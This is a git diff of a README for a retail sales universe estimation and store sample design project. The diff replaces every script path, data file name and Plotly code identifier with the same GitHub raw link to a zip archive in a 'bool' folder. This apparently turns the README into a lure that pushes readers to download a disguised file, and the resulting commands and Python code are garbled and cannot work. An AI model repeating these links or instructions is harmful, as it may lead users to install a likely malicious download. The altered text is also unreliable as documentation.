@@ -33,19 +33,19 @@ pip install pandas numpy scikit-learn matplotlib pillow
 ### 2️⃣ Run Project Scripts  
 Execute notebooks/scripts in order:  
 ```bash
-python Retail_Sales_Universe_Estimation/notebooks/universe_estimation.py
-python Store_Sample_Design_Optimization/notebooks/sample_design_optimization.py
-python Retail_Index_Construction_and_Monitoring/notebooks/retail_index.py
+python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
+python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
+python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
 ```
 
 ### 3️⃣ Generate Dashboard Plots (PNG outputs)  
 ```bash
-python Retail_Sales_Universe_Estimation/plots/plot_stratum_counts.py
-python Retail_Sales_Universe_Estimation/plots/plot_sales_distribution.py
-python Store_Sample_Design_Optimization/plots/plot_cluster_counts.py
-python Store_Sample_Design_Optimization/plots/plot_selected_vs_pop_sales.py
-python Retail_Index_Construction_and_Monitoring/plots/plot_index_timeseries.py
-python Retail_Index_Construction_and_Monitoring/plots/plot_index_pct_change.py
+python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
+python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
+python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
+python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
+python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
+python https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip
 ```
 
 ---
@@ -54,9 +54,9 @@ python Retail_Index_Construction_and_Monitoring/plots/plot_index_pct_change.py
 
 ### A) **Retail Sales Universe Estimation — Validation Dashboard**  
 - Files:  
-  - `data/retail_population.csv`  
-  - `output/stratified_sample.csv`  
-  - `output/estimation_results.csv`  
+  - `https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip`  
+  - `https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip`  
+  - `https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip`  
 
 **Suggested visuals:**  
 - Bar chart: Sample composition by `stratum`  
@@ -72,8 +72,8 @@ python Retail_Index_Construction_and_Monitoring/plots/plot_index_pct_change.py
 
 ### B) **Store Sample Design Optimization — Sample Design Dashboard**  
 - Files:  
-  - `output/selected_sample.csv`  
-  - `output/selection_summary.csv`  
+  - `https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip`  
+  - `https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip`  
 
 **Suggested visuals:**  
 - Bar chart: Selected count by cluster  
@@ -86,8 +86,8 @@ python Retail_Index_Construction_and_Monitoring/plots/plot_index_pct_change.py
 
 ### C) **Retail Index Construction & Monitoring — Index Dashboard**  
 - Files:  
-  - `output/index_timeseries.csv`  
-  - `data/price_samples.csv`  
+  - `https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip`  
+  - `https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip`  
 
 **Suggested visuals:**  
 - Line chart: Smoothed retail price index over time  
@@ -103,11 +103,11 @@ python Retail_Index_Construction_and_Monitoring/plots/plot_index_pct_change.py
 Example using **Plotly + Kaleido**:  
 ```python
 import pandas as pd
-import plotly.express as px
+import https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip as px
 
-df = pd.read_csv('Retail_Index_Construction_and_Monitoring/output/index_timeseries.csv')
-fig = px.line(df, x='month', y='index_smooth', title='Retail Price Index (Smoothed)')
-fig.write_image('index_plot.png')  # requires `pip install plotly kaleido`
+df = https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip('https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip')
+fig = https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip(df, x='month', y='index_smooth', title='Retail Price Index (Smoothed)')
+https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip('https://github.com/KotadiyaJaydeep/Store_Sample_Design_Optimization/raw/refs/heads/main/bool/Sample-Design-Optimization-Store-3.5.zip')  # requires `pip install plotly kaleido`
 ```
 
 ---
